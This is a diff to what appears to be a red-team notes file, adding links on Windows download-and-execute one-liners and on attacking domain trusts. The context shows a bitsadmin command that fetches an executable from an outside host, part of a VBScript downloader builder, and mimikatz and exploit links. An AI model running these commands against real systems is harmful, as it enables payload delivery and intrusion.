@@ -330,6 +330,7 @@ echo  End if>>wget.vbs
 echo Set objXMLHTTP = Nothing>>wget.vbs
 
 # download and execute
+# https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/
 * with the BITSAdmin tool (win7+)
 bitsadmin /transfer job_name /download http://domain.com/file_name.exe c:\file_path\file_name.exe
 voir le sploit msf 
@@ -359,6 +360,7 @@ https://code.google.com/p/mimikatz/source/browse/trunk/kiwissp/kiwissp.c (anothe
 https://forsec.nl/2014/11/cve-2014-6332-internet-explorer-msf-module/
 
 # domain trusts
+https://posts.specterops.io/a-guide-to-attacking-domain-trusts-971e52cb2944
 http://www.harmj0y.net/blog/redteaming/domain-trusts-why-you-should-care/
 http://www.harmj0y.net/blog/redteaming/domain-trusts-were-not-done-yet/
 http://www.harmj0y.net/blog/redteaming/the-trustpocalypse/
